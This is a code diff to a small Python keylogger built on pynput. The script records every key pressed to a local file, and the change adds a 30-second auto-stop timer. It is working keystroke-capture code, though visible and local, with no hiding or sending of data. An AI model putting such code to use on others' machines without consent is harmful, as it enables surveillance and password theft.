@@ -1,21 +1,39 @@
 import pynput
 from pynput.keyboard import Key, Listener
 import logging
+from threading import Timer
 
-logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")
+max_duration = 30
 
-# Function to log keystrokes
-def on_press(key):
-    try:
-        logging.info(str(key))
-    except AttributeError:
-        logging.info("Special key {0} pressed: ".format(key))
+logging.basicConfig(filename=("keylog.txt"),
+                    level=logging.DEBUG, format="%(asctime)s: %(message)s")
 
-# Function to handle key release
-def on_release(key):
+
+def onKeyPress(key):
+    if hasattr(key, 'char'):
+        logging.info(f"key pressed: {key.char}")
+    else:
+        logging.info(f"Special key pressed: {key}")
+
+
+def onKeyRelease(key):
     if key == Key.esc:
-        return False # Stop the listener
+        return False
+
+
+def stopListener():
+    global listener
+    print(f"Maximum duration has reached ({max_duration}s). Exiting...")
+    logging.info(f"Maximum duration has reached ({max_duration}s). Exiting...")
+    listener.stop()
+
+
+timer = Timer(max_duration, stopListener)
+timer.start()
 
 # Start the listener
-with Listener(on_press=on_press, on_release=on_release) as listener:
+with Listener(on_press=onKeyPress, on_release=onKeyRelease) as listener:
     listener.join()
+
+
+timer.cancel()
